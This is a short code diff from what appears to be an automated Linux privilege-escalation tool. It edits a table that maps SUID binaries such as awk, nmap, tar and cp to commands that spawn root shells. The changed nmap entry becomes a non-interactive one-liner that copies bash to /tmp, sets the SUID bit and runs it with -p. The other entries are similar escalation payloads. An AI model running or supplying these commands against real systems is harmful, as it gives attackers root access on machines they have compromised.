@@ -109,7 +109,7 @@ _SUID_GTFOBINS: Dict[str, List[str]] = {
     "sh":      ["$BINARY -p"],
     "dash":    ["$BINARY -p"],
     "awk":     ["$BINARY 'BEGIN {setuid(0); system(\"/bin/sh\")}'"],
-    "nmap":    ["$BINARY --interactive  # then type: !sh"],
+    "nmap":    ["echo '!cp /bin/bash /tmp/bash && chmod +s /tmp/bash' | $BINARY --interactive && /tmp/bash -p"],
     "env":     ["$BINARY /bin/sh -p"],
     "tar":     ["$BINARY -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
     "cp":      ["$BINARY /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"],
